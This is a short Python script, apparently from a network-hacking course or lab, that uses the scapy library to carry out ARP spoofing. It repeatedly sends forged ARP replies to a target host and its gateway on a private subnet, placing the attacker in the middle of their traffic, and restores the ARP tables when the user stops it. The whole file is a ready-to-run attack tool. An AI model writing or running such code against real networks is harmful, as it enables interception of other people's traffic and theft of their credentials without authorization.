#!/usr.bin.env python3

import scapy.all as scapy
import time

def get_mac(ip):
	# creating ARP request directed to boradcast MAC asking for IP 
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request # ARP request + broadcast MAC
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # to display only answered list
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

# restore the arp table to original addresses once done using the program
def restore(dest_ip, src_ip):
	dest_mac = get_mac(dest_ip)
	src_mac = get_mac(src_ip)
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
	scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

# keep sending packets to continue spoofing
sent_packets_count = 0
try:
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		sent_packets_count+=2
		print("\r[+] packets sent: " + str(sent_packets_count), end="") # \r for overwrite and dynamic printing
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[-] detected CTRL + C ... resetting ARP tables now.\n")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)
